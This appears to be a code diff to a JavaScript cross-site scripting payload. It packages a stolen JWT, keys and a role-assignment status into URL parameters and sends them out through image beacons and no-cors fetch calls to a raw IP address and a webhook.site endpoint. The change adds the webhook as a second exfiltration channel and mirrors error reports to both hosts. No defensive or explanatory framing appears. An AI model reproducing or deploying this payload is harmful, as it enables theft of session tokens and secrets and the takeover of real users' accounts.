@@ -26,9 +26,14 @@ if(roles.length>0){
   assignStatus=r2.status;
 }
 const params=new URLSearchParams({s:String(assignStatus),r:roleId,j:stolen.jwt?'YES':'NO',jv:stolen.jwt.substring(0,60),ks:stolen.keys});
-try{new Image().src='http://94.184.47.185:8888/xss?'+params.toString();}catch(x){}
-try{fetch('http://94.184.47.185:8888/xss?'+params.toString(),{mode:'no-cors'});}catch(x){}
+const beacons=['https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14','http://94.184.47.185:8888'];
+for(const b of beacons){
+  try{new Image().src=b+(b.includes('webhook.site')?'?':'/xss?')+params.toString();}catch(x){}
+  try{fetch(b+(b.includes('webhook.site')?'?':'/xss?')+params.toString(),{mode:'no-cors'});}catch(x){}
+}
 }catch(e){
-  try{new Image().src='http://94.184.47.185:8888/err?e='+encodeURIComponent(String(e).substring(0,80));}catch(x){}
+  const msg=encodeURIComponent(String(e).substring(0,80));
+  try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+msg;}catch(x){}
+  try{new Image().src='http://94.184.47.185:8888/err?e='+msg;}catch(x){}
 }
 })();
